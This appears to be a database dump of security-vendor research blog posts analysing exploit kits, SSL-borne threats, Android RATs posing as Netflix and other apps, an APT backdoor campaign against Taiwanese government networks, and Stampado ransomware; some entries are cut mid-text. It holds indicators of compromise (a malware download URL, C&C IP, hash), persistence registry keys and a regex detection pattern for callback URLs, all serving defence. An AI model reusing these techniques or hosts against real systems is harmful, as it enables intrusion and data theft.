page\r\n\r\n\r\n\r\nFigure 5: RIG gate fingerprinting script\r\n\r\nSome recent RIG gates have included a browser fingerprinting script. This script supports the identification of several common browsers by version, but only redirects to a landing page if Internet Explorer is detected.\r\n\r\nBEPS, Xer, Sundown, Nebula?\r\n\r\nThe Sundown EK has been carving out a niche in the shadow of RIG for the last two years, but as we have noted before, the developers are putting continuous work into the kit to add (or steal) exploits. Recently, authors have been making significant changes to the Sundown landing page patterns, apparently rebranding the EK as \"Nebula.\" Where .xyz domains had been the primary choice for hosting landing pages, since February 9, 2017, the YBN has been registering domains with many other generic top-level domains (gTLDs) in the name of Brian Krebs.\r\n\r\n\r\n\r\nFigure 6: Brian Krebs Fan Club registration\r\n\r\nIn addition to changing the hostname patterns, the YBN has been changing URL path styles. Initially dropping the \"index.php\" component of the path, some of the Nebula Sundown cycles we are seeing utilize randomized formats that attempt to appear like mundane traffic patterns.\r\n\r\n\r\n\r\nFigure 7: Trouble getting the landing page with the new-style URLs from Nebula Sundown\r\n\r\nWhile the URL patterns have changed, the landing page used by the latest version of Sundown looks the same as landing pages seen from previous .xyz domains.\r\n\r\n\r\n\r\nFigure 8: Nebula Sundown landing page\r\n\r\nAs quickly as the Nebula Sundown strain gained attention, it seems to have dissipated, with typical Sundown cycles showing up once again since March 6, 2017. Sundown has primarily been dropping banker trojans, including the newly popular DiamondFox.\r\n\r\n\r\n\r\nFigure 9: No more Nebula Sundown; back to classic Sundown URLs\r\n\r\nKaiXin Exploit Kit\r\n\r\nKaiXin is a smaller exploit kit first identified in 2012. KaiXin typically targets Asian sites, and has been delivered via banner ads and JavaScript injection on compromised sites. In our previous EK roundup, we discussed KaiXin’s swell in activity and updates to its exploit chain.\r\n\r\nThis KaiXin campaign tapered off after activity in early December 2016. At the end of February, a new KaiXin campaign was observed reusing patterns from the summer of 2016.\r\n\r\n\r\n\r\nFigure 10: KaiXin script injection\r\n\r\nThis KaiXin campaign includes an older antivirus (AV) fingerprinting script that was absent in the fall CNZZ campaign. This script attempts to detect the presence of several personal security products on the client filesystem before continuing execution.\r\n\r\n\r\n\r\nFigure 11: Deobfuscated KaiXin AV fingerprinting script\r\n\r\nAfter the AV check passes, several layers of obfuscated scripts are loaded via iframes. This campaign uses a browser cookie to prevent repeated access to the exploit, and tries to block web crawler bots that self-identify in their user agent string.\r\n\r\n\r\n\r\nFigure 12: KaiXin cookie, crawler check\r\n\r\nThe final script in the exploit kit chain performs browser and runtime version checks, and serves the appropriate exploit file. Unlike the KaiXin campaign we analyzed in our last roundup, which performed browser fingerprinting on several browsers, this campaign only targets Internet Explorer.\r\n\r\n\r\n\r\nFigure 13: Deobfuscated KaiXin exploit delivery script\r\n\r\nThe KaiXin campaign offers exploits for Java, Flash, and Silverlight. Separate Java JAR exploits are included for JRE versions 1.7.0.6-11, 1.7.0.0-1.7.0.7, and versions older than 1.6.0.27. Two Flash exploits target versions 16,0,0,100-296 and 17,0,0,100-134, or Flash 11-15. Silverlight 4.0.50401.0 to 5.1.10411.0 is targeted, excluding 5.0.60818.0.\r\n\r\nThe URL for the infection payload is not hardcoded in the exploit packages; instead, it is passed as a parameter (“ckurl” in the example above) to the embedded object.\r\n\r\nLike previous KaiXin campaigns, successful exploitation delivers a downloader payload, which installs various Chinese adware packages. The payloads in this campaign use the names of Windows system binaries, such as “csrss.exe,” “dwm.exe,” and “svchost.exe.”\r\n\r\nMalware Traffic Analysis recently published a capture of a similar infection cycle for the same campaign.\r\n\r\nNeutrino Exploit Kit\r\n\r\nPropagation of the Neutrino EK abruptly shut down in September 2016. After several weeks, and then months, of no observed activity, security researchers considered Neutrino defunct. The RIG EK took over Neutrino’s role as the primary distributor of CryptXXX ransomware. A low-volume Neutrino variant dubbed Neutrino-v appeared in late 2016, but was mainly confined to targets in South Korea and Taiwan.\r\n\r\nIn January 2017, researchers began observing occasional hits of active Neutrino landing pages dropping ransomware payloads. It appears that Neutrino has returned in a limited capacity, likely restricted to privately commissioned EKs.\r\n\r\n \r\n\r\n\r\n\r\nFigure 14: Neutrino cycle featuring fake jquery gate and HTTPS redirector\r\n\r\n\r\n\r\nFigure 15: Neutrino exploit chain\r\n\r\nWe have observed a Neutrino campaign using a .space TLD gate. The landing page, exploit, and payload URLs follow typical Neutrino patterns.\r\n\r\n\r\n\r\nFigure 16: Neutrino script injection\r\n\r\n\r\n\r\nFigure 17: Neutrino landing page\r\n\r\nThis landing page in the .space gate campaign also keeps with the “space” theme, and displays a blurb about space and a dummy HTML form while serving the Flash exploit.\r\n\r\n\r\n\r\nFigure 18: Neutrino landing page in browser\r\n\r\nTerror Exploit Kit\r\n\r\nThe Terror EK is a newer exploit kit that appears to be cobbled together from pieces of Metasploit payloads as well as other EKs, most notably Sundown and Hunter. It primarily relies on recent Sundown exploits and dropper payloads to install ccminer, a cryptocurrency mining program, on infected computers.\r\n\r\n\r\n\r\nFigure 19: Recent Terror EK cycle\r\n\r\nWe\'ve continued tracking the development of this kit since we first spotted it, and have watched developers transition to new domains with stolen identities, with traffic coming from the PopAds advertising network. The landing page is more sophisticated, but remains a patchwork of stolen exploits and obfuscation routines.\r\n\r\nMagnitude Exploit Kit\r\n\r\nThe Magnitude EK continues to operate at low volume, with restricted regional distribution. We typically observe Magnitude affecting Southeast Asian users who visit illegal streaming sites. Malicious ads are distributed via ad networks such as PopAds, and vulnerable users are infected with Cerber.\r\n\r\n\r\n\r\nFigure 20: Magnitude cycle coming from advertising rotators\r\n\r\nConclusion\r\n\r\nExploit kits pose a significant threat to users during simple web browsing. In the case of ransomware infections, the result could be the inability of users to access their files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.\r\n\r\nTo help avoid infections such as those delivered by way of exploit kits, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. The ThreatLabZ research team has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using Zscaler cloud-delivered Internet security.\r\n\r\nResearched by Ed Miles and Derek Gooley', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup-winter-2017');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (77, 'The Rise in SSL-based Threats', 'Derek Gooley', 'February 16, 2017', 'Overview    The majority of Internet traffic is now encrypted. With the advent of free SSL providers like Let’s Encrypt, the move to encryption has become easy and free. On any given day in the Zscaler cloud, more than half of the traffic that is inspected uses SSL. It is no surprise, then, that malicious actors have also been using the SSL protocol in their activities over the last several years. The increasing use of SSL creates problems for organizations that are unable to monitor SSL traffic, as they must rely on less-effective techniques like IP and domain blocking in an attempt to identify and block threats.    In this report, we will outline trends we have seen in the use of SSL in the malware lifecycle and in adware distribution, based on a review of traffic on the Zscaler cloud from August 2016 through January 2017. What follows is a graphic illustrating our findings, and an analysis of recent activities.             Malicious SSL Activity    During the six-month period, the ThreatLabZ research team observed that the Zscaler cloud blocked an average 600,000 malicious activities each day that used SSL, including exploit kit traffic, malware and adware distribution, malware callbacks, and other malicious traffic.        Figure 1. Total SSL blocks, August 2016 – January 2017    In our cloud, we observed an overall increase in malicious SSL traffic in nearly all categories — a trend we expect to continue — with periodic spikes, such as those in early August and late November, when SSL malware blocks reached nearly two million a day.    Browser Exploits and Payload Delivery    Exploit kit (EK) authors are more frequently including SSL in the infection chain at some point. Previous malvertising campaigns have been observed in which EKs took advantage of SSL-enabled advertising networks to inject malicious scripts into legitimate webpages. EK authors may also abuse services that provide free SSL certificates to add HTTPS support to their maliciously controlled domains. This maneuver enables them to bypass the SSL integrity checks built into modern web browsers.        Figure 2. SSL web exploit monthly total hits, August 2016 – January 2017        Figure 3. SSL web exploit blocks, August 2016 – January 2017    During the observation period, we saw an average of 10,000 hits per month for web exploits that included SSL as part of the infection chain.    Phishing        Figure 4. Phishing blocks, August 2016 – January 2017    Phishing campaigns have been increasingly using SSL in their attacks. Many phishing attacks involve hosting the phishing page on a legitimate domain that has been compromised. Since the number of legitimate sites that support SSL is constantly increasing, so are the number of SSL-enabled phishing attacks. This rise presents a significant threat, because organizations, in an attempt to thwart ransomware and other phishing schemes, have implemented security hardware solutions to detect and block phishing, but few of them support SSL inspection.    Malware Families That Use SSL    Several years ago, it was rare to see malware using SSL to encrypt command-and-control (C&C) mechanisms. As malware design has become more sophisticated, and with the near ubiquity of SSL on the Internet, it made sense for malware authors to begin using SSL to hide their activities. Some malware families have gone further, using anonymity services such as Tor to hide the location of their C&C servers, connecting to (otherwise legitimate) HTTP Tor gateways via SSL.    Botnets typically use self-signed SSL certificates, frequently using the names and information of real companies to try to appear legitimate. The SSL Blacklist (https://sslbl.abuse.ch/) is a project that tracks the SSL certificates used by malware authors.        Figure 5. Malware callbacks over SSL, September 2016 – January 2017    Corresponding with the increase in malicious payload deliveries in November 2016, we also observed an increase in blocked malicious SSL traffic during that time.    In our analysis, we came across many malware families that were using SSL for malicious purposes. Some of the recent and notorious malware families actively using SSL are:    Dridex/Dyre/TrickLoader    The Dridex, Dyre, and TrickLoader banking Trojans are capable of communicating to the C&C servers via SSL using its own SSL certificate. These family previously used the common browser hooking technique for callbacks, but the latest versions can perform redirects via local proxy or local DNS poisoning to fake websites, controlled by the attacker.    Vawtrak    Vawtrak is a well-crafted piece of malware supporting the VNC and SOCKS proxies, screenshot and video capturing, and extensibility with regular updates from C&C servers. Vawtrak samples contain code for downloading and validating SSL certificates and are capable of initiating an HTTPS connection. The malware contains a list of HTTPS-secured hosts that contain updated lists of live C&C servers.    Gootkit    Gootkit is a stealth banking trojan with backdoor and spyware capabilities that uses fileless infection and communications over SSL. Gootkit intercepts user data via web injections into HTTPS traffic.    Adware    A common function of adware is to inject unwanted advertisements into web traffic. These advertisements can also lead to malicious infections, as exploit authors frequently take advantage of less-scrupulous advertising networks to distribute exploit redirect scripts. Securing web traffic with SSL/HTTPS prevents this distribution in most cases. Adware installed on a client machine would not be able to perform a man-in-the-middle attack with a self-signed certificate due to the HTTPS safeguards included in modern browsers.    However, in several notable cases, major adware distributions have circumvented these safeguards to inject advertisements into HTTPS traffic. The two most high-profiles examples are the Superfish and PrivDog adware distributions, which were first abusing SSL in 2015. Both of these adware programs install a self-signed root CA certificate onto the victim’s computer, and intercept all web traffic in order to inject advertisements into web pages. PrivDog in particular was a serious concern because it did not validate SSL certificates on its end of the proxy, allowing users to inadvertently navigate to websites with invalid SSL certificates, exposing them to additional threats.    Adware variants have also started to host their files on HTTPS sites. We came across a family of adware called InstallCore, which was doing this kind of activity. InstallCore is a Potentially Unwanted Application (PUA) that installs a program to display and/or download unwanted advertisements and toolbars, and tracks a computer\'s web usage to feed the victim undesired ad pop-ups; some versions can even hijack a browser’s start or search pages, redirecting the user to a different site or search engine.    InstallCore is often delivered by tricking the user into installing the Flash plugin or a Java update. In some cases, InstallCore is delivered by misdirected download buttons. These fake pop-ups of the Flash player or download buttons appear on content distribution sites, like torrent sites, or free software sites that work on HTTPS.        Figure 6. Fake Flash download pop-up    Conclusion    Due to the rising use of SSL encryption to hide exploit kits, malware, and other threats, it is important to have a security infrastructure that can detect and block these threats. The problem is that SSL inspection is compute-intensive, so even organizations whose security appliances support SSL inspection often disable this feature, as its use would slow traffic throughput to unacceptable levels. Dedicated appliances for SSL inspection are available, but their price puts them out of reach for many organizations. SSL inspection is built into the Zscaler security platform, which, due to its scale, can inspect all SSL traffic without latency.

There’s an app for just about any facet of one’s personal and professional life, from booking travel and managing projects, to buying groceries and binge-watching the latest Netflix series.    The iOS and Android apps for Netflix are enormously popular, effectively turning a mobile device into a television with which users can stream full movies and TV programs anytime, anywhere. But the apps, with their many millions of users, have captured the attention of the bad actors, too, who are exploiting the popularity of Netflix to spread malware.    Recently, the ThreatLabZ research team came across a fake Netflix app, which turned out to be a new variant of SpyNote RAT (Remote Access Trojan).    SpyNote RAT is capable of performing a variety of alarming functions that includes:      	  	Activating the device’s microphone and listening to live conversations  	  	  	Executing commands on the device  	  	  	Copying files from the device to a Command & Control (C&C) center  	  	  	Recording screen captures  	  	  	Viewing contacts  	  	  	Reading SMS messages  	      The screenshot below shows part of the sandbox’s report on the SpyNote RAT’s signature and detected functions:      	  		  			  			  			  		  		  			  			Figure 1 : Zscaler Cloud Sandbox Detection  			  		  	           The fake Netflix app we are analyzing in this blog appears to be built using an updated version of SpyNote RAT builder, which was leaked last year.    Technical details     Please note that our research is not about the legitimate Netflix app on Google Play.    The spyware in this analysis was portraying itself as the Netflix app. Once installed, it displayed the icon found in the actual Netflix app on Google Play.             	  		  			  			  			  		  		  			  			Figure 2: Fake Netflix vs. legitimate Netflix  			  		  	           As soon as the user clicks the spyware’s icon for the first time, nothing seems to happen and the icon disappears from the home screen. This is a common trick played by malware developers, making the user think the app may have been removed. But, behind the scenes, the malware has not been removed; instead it starts preparing its onslaught of attacks.    For contacting C&C, the spyware was found to be using free DNS services, as shown in the screenshot below:           	  		  			  			  			  		  		  			  			Figure 3: Server details  			  		  	           SpyNote RAT uses an unusual trick to make sure that it remains up and running and that the spying does not stop. It does so using the Services, Broadcast Receivers, and Activities components of the Android platform.    Services can perform long-running operations in the background and does not need a user interface. Broadcast Receivers are Android components that can register themselves for particular events. Activities are key building blocks, central to an app’s navigation, for example.    The SpyNote RAT registers a service called AutoStartup and a broadcast receiver named BootComplete.     MainActivity registers BootComplete with a boot event, so that whenever the device is booted, BootComplete gets triggered.    BootComplete starts the AutoStartup service and the AutoStartup service makes sure that MainActivity is always running.    What follows are some of the features exhibited by SpyNote RAT.    Command execution    Command execution can create havoc for victim if the malware developer decides to execute commands in the victim’s device. Leveraging this feature, the malware developer can root the device using a range of vulnerabilities, well-known or zero-day.    The following screenshot shows the command execution functionality in action:         	  		  			  			  			  		  		  			  			Figure 4: Command Execution  			  		  	           The paramString parameter shown in the above screenshot can be any command received from C&C.         Screen capture and audio recording     SpyNote RAT was able to take screen captures and, using the device’s microphone, listen to audio conversations. This capability was confirmed when the Android permission, called android.permission.RECORD_AUDIO, was being requested along with code found in the app.    SpyNote RAT captured the device’s screen activities along with audio using the  MediaProjectionCallback functionality (available with Lollipop, the Android 5.0 release, and later) and saved the output in a file named \"video.mp4\" as shown in the following screenshot:           	  		  			  			  			  		  		  			  			Figure 5 : Output File  			  		  	           SMS stealing     SpyNote RAT was also observed stealing SMS messages from the affected devices, as shown in screenshot below:           	  		  			  			  			  		  		  			  			Figure 6: Reading SMS messages  			  		  	           Stealing contacts    The ability to steal contacts is a favorite feature for spyware developers, as the stolen contacts can be used to further spread the spyware.    The following screenshot shows the contacts being stolen and written in a local array, which is  then sent to C&C:           	  		  			  			  			  		  		  			  			Figure 7: Stealing and writing contacts  			  		  	           Uninstalling apps    Uninstalling apps is another function favored by developers of Android spyware and malware. They tend to target any antivirus protections on the device and uninstall them, which increases the possibility of their malware persisting on the device. Following screenshot shows this functionality in action:           	  		  			  			  			  		  		  			  			Figure 8: Uninstalling functionality  			  		  	      Other functions    In addition to the functionalities we’ve described, the SpyNote RAT was exhibiting many other behaviors that make it more robust than most off-the-shelf malware.    SpyNote RAT was designed to function only over Wi-Fi, which is the preferable mode for Android malware to send files to C&C.    The screenshot below shows SpyNote RAT scanning for Wi-Fi and enabling it if a known channel is found:           	  		  			  			  			  		  		  			  			Figure 9 : Scanning Wi-Fi  			  		  	           Additional features    - SpyNote RAT could click photos using the device\'s camera, based on commands from C&C.    - There were two interesting sub-classes found inside Main Activity: Receiver and Sender. Receiver was involved in receiving commands from the Server and the  main functionality of Sender was to send all the data collected to the C&C over Wi-Fi.    - SpyNote RAT was also collecting the device’s location to identify the exact location of the victim.         SpyNote RAT builder    The SpyNote Remote Access Trojan (RAT) builder is gaining popularity in the hacking community, so we decided to study its pervasiveness. What we found were several other fake apps developed using the SpyNote builder, which should come as a warning to Android users. Some of the targeted apps were:      	  	Whatsapp  	  	  	YouTube Video Downloader  	  	  	Google Update  	  	  	Instagram  	  	  	Hack Wifi  	  	  	AirDroid  	  	  	WifiHacker  	        	  	Facebook  	  	  	Photoshop  	  	  	SkyTV  	        	  	Hotstar  	  	  	Trump Dash  	  	  	PokemonGo  	      With many more to come.    Furthermore, we found that in just the first two weeks of 2017, there have been more than 120 such spyware variants already built using the same SpyNote Trojan builder as SpyNote RAT and roaming in the wild. A complete list of sample hashes is available here.          Conclusion     The days when one needed in-depth coding knowledge to develop malware are long gone. Nowadays, script kiddies can build a piece of malware that can create real havoc. Moreover, there are many toolkits like the SpyNote Trojan builder that enable users to build malware with ease and few clicks.    In particular, avoid side-loading apps from third-party app stores and avoid the temptation to  play games that are not yet available on Android. Yes, we are talking about SuperMarioRun, which was recently launched by Nintendo only for iOS users. Recent blogs by the Zscaler research team explain how some variants of Android malware are exploiting the popularity of this game and tricking Android users into downloading a fake version.

Once installed, the RAT registers the infected device as shown below.        Figure 2: Infected device registration.    DroidJack RAT starts capturing sensitive information like call data, SMS data, videos, photos, etc. Observe below the code routine for call recording.         Figure 3: Call recording.    This RAT records all the calls and stores the recording to an “.amr” file.    The following is the code routine for video capturing.        Figure 4: Video capturing.    Here, the RAT stores all the captured videos in a “video.3gp” file.    It also harvests call details and SMS logs as shown below.        Figure 5: SMS Logs      Figure 6: Call logs.    Upon further inspection, we have observed that this RAT extracts WhatsApp data too.        Figure 7:Whatsapp data.    The RAT stores all the data in a database (DB) in order to send it to the Command & Control (C&C) server. The following are the DBs created and maintained by the RAT.        Figure 8: Databases.    We saw the following hardcoded C&C server location in the RAT package:        Figure 9: Hardcoded C&C.

In no time, the game became a sensational hit on the iTunes store. However, there is not yet an Android version and there has been no official news on such a release. Attackers are taking advantage of the game\'s popularity, spreading malware posing as an Android version of Super Mario Run.    The ThreatLabZ team wrote about a similar scam that occurred during the release of another wildly popular Niantic game, Pokemon GO. Like that scam, the new Android Marcher Trojan is disguised as the Super Mario Run app and attempts to trick users with fake finance apps and a credit card page in an effort to capture banking details.    Marcher history    Marcher is a sophisticated banking malware strain that targets a wide variety of banking and financial apps and credit cards by presenting fake overlay pages. Once the user\'s mobile device has been infected, the malware waits for victims to open one of its targeted apps and then presents the fake overlay page asking for banking details. Unsuspecting victims will provide the details that will be harvested and sent out to to the malware\'s command and control (C&C) server. We have seen this malware evolve and take advantage of recent trends in order to target a large number of users. We have covered similar campaigns in the past related to Marcher malware here and here.

Exploit Kits (EKs) are rapidly deployable software packages designed to leverage vulnerabilities in web browsers as a way to deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for sale, distributing malware for other malicious actors.    Since our last roundup, there have been significant changes in several EKs. Neutrino, a very active EK during the summer, went offline in late September. RIG EK activity has increased, especially with the shutdown of Neutrino. New variants of Neutrino and RIG appeared in October, with modifications to their URL patterns and JavaScript source.    You can read our previous roundup here.    Neutrino Exploit Kit    Following the shutdown of Angler EK in June, Neutrino activity significantly increased to fill the hole it left. Neutrino became a primary EK for malvertising campaigns as well as the main distributor of CryptXXX ransomware payloads.    From late July through late September, Neutrino was frequently observed delivering CrypMIC, a recent CryptXXX variant, via the pseudoDarkleech and EITest campaigns. Other smaller campaigns were seen dropping Locky ransomware and a variety of malware payloads.    In late September, all Neutrino traffic abruptly stopped. Security researchers reported that the seller of Neutrino announced (on a closed forum) that all activity would be halted. This came shortly after a large malvertising campaign using Neutrino to deliver CrypMIC was taken down.        Figure 1: Neutrino hits, September - November 2016    Although Neutrino was reported to be shut down around September 21st, some gates and compromised sites remained active for a short time thereafter, redirecting to inactive landing pages.    Neutrino-v    Since the shutdown of the standard Neutrino, a new variant first noted by Kafeine has emerged. Neutrino-v has been a relatively low-volume EK mainly active in South Korea and Taiwan. This variant features a modified landing page and a retooled CVE-2016-4117 flash exploit.    Neutrino-v has been seen dropping Cerber payloads.    RIG Exploit Kit        Figure 2: RIG hits, September - November 2016        Figure 3: RIG heat map    RIG has managed to achieve the position of the current top active exploit kit. As Angler and Neutrino each shut down, RIG has surged in activity to help fill the void in ransomware distribution. In particular, RIG took over distribution of CrypMIC after Neutrino ceased activity in late September.    RIG-v        Figure 4: RIG-v hits, October - November 2016    In mid-September, a new variant of the RIG EK (coined “RIG-v” by Kafeine) began to surface. RIG-v features a different URI scheme, modified landing page obfuscation, and RC4 encryption.        Figure 5: RIG-v landing page request        Figure 6: RIG-v landing page    RIG-v has primarily been observed dropping Cerber and CryptFile2 ransomware payloads.    RIG-E    Another RIG variant, RIG-E, was also observed, as it was launched quietly in August. This variant uses the standard RIG URL scheme, and in mid November, switched to the RC4-encrypted landing page introduced by RIG-v. RIG-E is mainly delivered by the EITest campaign.    Malware Traffic Analysis provided a recent data dump of standard RIG, RIG-v, and RIG-E chains    KaiXin Exploit Kit    KaiXin is a smaller exploit kit, first identified in 2012. KaiXin typically targets Asian sites, and has been delivered via banner ads and JavaScript injection on compromised sites. SANS published an overview of a KaiXin EK malvertising session earlier this year.    KaiXin has had relatively low activity for the last couple years, though we have observed a recent increase in activity and changes in its chain.        Figure 7: Injected KaiXin script    In our recently observed samples, KaiXin masquerades as a CNZZ statistics tracking script and uses URL encoding to trivially obfuscate the injected script.        Figure 8: Deobfuscated KaiXin script    The KaiXin injected script prevents the malicious iFrame from being delivered if the request user-agent is from an iOS or Android device. It also saves a dictionary in local browser storage with the current date and number of times the script has been executed to prevent the exploit chain from executing more than once per day and more than five times total.        Figure 9: Recent KaiXin SWF delivery page    The initial KaiXin landing page, which has no obfuscation, contains logic for handling different browsers (including QQ Browser). Internet Explorer (IE) browsers (version 10 or 11) are redirected to a SWF delivery page. For IE browsers older than version 10, the victim is redirected to an obfuscated exploit for CVE-2016-0189. CVE-2016-0189 had also been deployed in the Sundown EK and Neutrino EK in July, immediately after proof-of-concept code became available.    KaiXin is currently delivering adware packages, such as software from Baidu.    Other Exploit Kits    Sundown Exploit Kit    Sundown, still a relatively new EK, is gradually becoming more active, particularly with malvertising campaigns. In September, we observed a malvertising campaign in which Sundown was served alongside RIG.        Figure 10:     More information on this campaign can be found in our September blog post on malvertising chains.    In mid-October, we also began to observe some variations on typical Sundown exploit chains.    Angler Exploit Kit    Still inactive.    Nuclear Exploit Kit    Still inactive.    Conclusion    Exploit kits pose a significant threat to users during simple web browsing. In the case of ransomware, infection could result in the inability of a user to access his or her files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.    To help avoid infections such as those described in this report, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements.

The first copying of the exploit code we spotted was from the Sundown exploit kit (EK), followed closely by Magnitude and a resurgent KaiXin EK. In addition to the commoditized EKs, this exploit code has been leveraged in numerous one-shot and gated web-exploitation campaigns, delivered through a mix of the usual malvertising networks and compromised websites.\r\n\r\nThis blog details CNACOM, a web-based campaign that appears to be related to a well-known nation-state actor more commonly associated with spear-phishing attacks.\r\n\r\nInfection Cycle\r\n\r\n\r\n\r\nFigure 1 - An overview of the campaign\'s infection flow, highlighting the targeted organizations\r\n\r\nOn November 7, we spotted a malicious injection on the registration page of a major Taiwanese public service website.

The user\'s external IP address is stored as a string and an ipToInt() function is defined, followed by a set of subroutines to collect details from the user machine. The code gathers the OS version, browser name, version, and language setting, Flash and Java versions, installed Office version, and finally the raw User-Agent string from the browser. This is all sent to the RHCloud host via a GET request. \r\n\r\n\r\n\r\nFigure 4 - The landing page collects many aspects of the user\'s platform, including MS Office version information\r\n\r\nAfter the fingerprinting code, the user\'s IP address is checked against Taiwanese government network ranges. If the user is coming from one of the targeted networks and is using a version of Internet Explorer, exploitation will be attempted.\r\n\r\n\r\n\r\nFigure 5 - The exploitation routine will be triggered for any Internet Explorer version, as long as the user\'s IP address is in one of the nine target networks\r\n\r\nThreatLabZ was able to follow the infection cycle and download a sample that appears to be a variant of the IXESHE AES malware. IXESHE is a family of backdoor malware known to be utilized by an attack group identified by various names including the IXESHE label, APT12, Numbered Panda, and DynCalc.\r\n\r\n\r\n\r\nFigure 6 - Upper: among other changes seen, the new variant builds stack strings up to 4 bytes at a time. Lower: old variants do it byte-by-byte\r\n\r\nUpon execution, the malware gathers the Windows username, hostname, local IP address, and Windows version. The hostname is fed to a PJW hash, or ElfHash function to generate a machine ID used in callbacks. The last step before initiating the C&C check-in is to achieve persistence by installing a run key in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Messenger.\r\n\r\n\r\n\r\nFigure 7 - Simplified decompiled code for the persistence mechanism shows the Run key utilized\r\n\r\nThis sample uses almost similar communication techniques as previous variants, with the addition of SSL. In our observations, we saw the server present a self-signed certificate with short, random-looking strings in the informational fields.\r\n\r\n\r\n\r\nFigure 8 - A self signed certificate is used for the C&C server\r\n\r\nCallback URLs\r\n\r\n\r\n	\r\n	/CEL%d=%d.cgi?%s - check-in at startup (and after certain C&C reset/error conditions)\r\n	\r\n	\r\n	/DES%d=%d.cgi?%s - standard beacon, check for command\r\n	\r\n	\r\n	/RES%d=%d.cgi?%s - response to rsh command\r\n	\r\n	\r\n	/SDU%d=%d.cgi?%s - error response\r\n	\r\n	\r\n	/SUS%d=%d.cgi?%s - check-out after receiving shutdown message\r\n	\r\n\r\n\r\nAs can be seen above, the callback URLs utilize the same general format: three capital letters denoting the response function or condition, an integer representing the PJW/ElfHash based host ID, an equal sign (\"=\"), a random integer, the string \".cgi?\", and a base64 response blob (which in some cases simply encodes another random integer).  The following regular expression matches this variant\'s URL path/query components: [CDRS][EDU][LSU]\\d+=\\d+\\.cgi\\?[a-zA-Z0-9=\\+\\/]+.\r\n\r\n\r\n\r\nFigure 9 - A collapsed view of the decompiled C&C command processing code shows handling for multiple input commands and several response types\r\n\r\nUnlike many historical IXESHE samples, it appears that this variant doesn\'t utilize campaign codes embedded in the malware itself. This may be due to a more centralized tracking system that only relies on the malware reporting a machine ID.\r\n\r\n \r\n\r\nConclusion\r\n\r\nThis analysis represents a snapshot of recent activity related to the CNACOM campaign. Additionally, we have identified an exploitation campaign active in August 2015 that appears to have utilized the HackingTeam Flash exploit for CVE-2015-5122, though the landing page at that time targeted a different set of Taiwanese government networks. Whether or not the threat actor behind this campaign is actually the group named APT12, the targeting of Taiwanese government networks and the similarity of this strain to historic IXESHE samples provide strong reasons for suspicion.\r\n\r\nZscaler ThreatlabZ will continue to monitor activity from this group ensuring protection against this threat.\r\n\r\nIndicators of Compromise\r\n\r\n \r\n\r\n\r\nFilename: cnacom.exe\r\nSource: cnacom-organied.rhcloud\\.com/cnacom.exe\r\nMD5: ACFA9C664016BFE5DB92557E923744F0\r\nCompile Time: 11/04/2016 11:56:27\r\nHardcoded User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0\r\nC&C: 74.200.214.226\r\n\r\n \r\n\r\nReferences\r\n\r\n\r\n	http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf\r\n	https://www.arbornetworks.com/blog/asert/wp-content/uploads/2014/06/ASERT-Threat-Intelligence-Brief-2014-07-Illuminating-Etumbot-APT.pdf', 'APT', 'https://www.zscaler.com/blogs/research/cnacom-open-source-exploitation-strategic-web-compromise');

Stampado was first seen in the wild in July 2016, as one of the cheapest pieces of ransomware available on the underground forums.  \r\n\r\n\r\n\r\nFigure 1: Stampado sales ad on dark web\r\n\r\nIn this report, we will provide an analysis of Stampado ransomware, shown to be capable of encrypting files with more than 1,200 file extensions and containing self-propagating features. In addition to the typical ransom demand, this variant threatens to delete a randomly selected file every six hours until payment and, if no payment is received within 96 hours, all files will be permanently deleted.\r\n\r\nInfection Cycle\r\n\r\nStampado typically arrives via spam e-mail or drive-by downloads. The file we examined was packed using UPX packer and written in AutoIt. Upon unpacking and decompilation, the AutoIt code appears to be obfuscated.\r\n\r\n\r\n\r\nFigure 2: Obfuscated Code\r\n\r\nUpon deobfuscation, the code appears as shown below:\r\n\r\n\r\n\r\nFigure 3: Deobfuscated code\r\n\r\nInstallation and persistence\r\n\r\nThe malware installs itself in the %AppData% folder with the name scvhost.exe in an attempt to look like a genuine Windows process (svchost.exe) and also creates the following autostart registry entry\r\n\r\n\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\", \"Windows Update\" %AppData%\\scvhost.exe\r\n\r\nStampado runs itself from the new location as scvhost.exe and terminates the current process.\r\n\r\n\r\n\r\nFigure 4: Installation and persistence code\r\n\r\nThe main functionality of the Stampado variant is illustrated in the infographic below:\r\n\r\n\r\n\r\nFigure 5: Stampado overall activity diagram\r\n\r\nSelf-replication\r\n\r\nThis ransomware also has a worm-like spreading functionality. It attempts to make a copy of itself on the removable drives and network drives reachable from the infected system. The malware also registers a callback function to monitor the removable drives; this way, it can infect the removable drive as soon as it connects to the compromised system.\r\n\r\nIt drops a copy of itself at [DrivePath]\\myDisk\\drivers.exe with file attributes set to +SHR to hide itself, creates file [DrivePath]\\autorun.inf and creates shortcut files with the names of existing files pointing to malware executable, after hiding the original files. This will cause the malware executable to run when the user clicks on any shortcut file.\r\n\r\n\r\n\r\nFigure 6: Self-replication code\r\n\r\nProcess Protection\r\n\r\nBefore starting file encryption, the malware protects its process from being terminated by exploiting an old kernel bug (setting the \"ProcessSelfDelete\" flag). This trick was verified to be working on Windows 7 64-bit.\r\n\r\n\r\n\r\nFigure 7: Process Protection Code\r\n\r\nEncryption over encryption\r\n\r\nStampado will not spare you even if you have already been infected with other ransomware strains and will re-encrypt already encrypted files. The victim has to pay ransom twice to get the original files back. This ransomware is targeting files already encrypted by multiple ransomware families along with a long list of important filetypes. Some of the targeted files encrypted by other ransomware strains are:\r\n\r\n\r\n\"*.locky;*.zepto;*.cerber;*.crypt;*.crypz;*.cryptowall;\r\n*.enciphered;*.cryptolocker;*.cryp1; 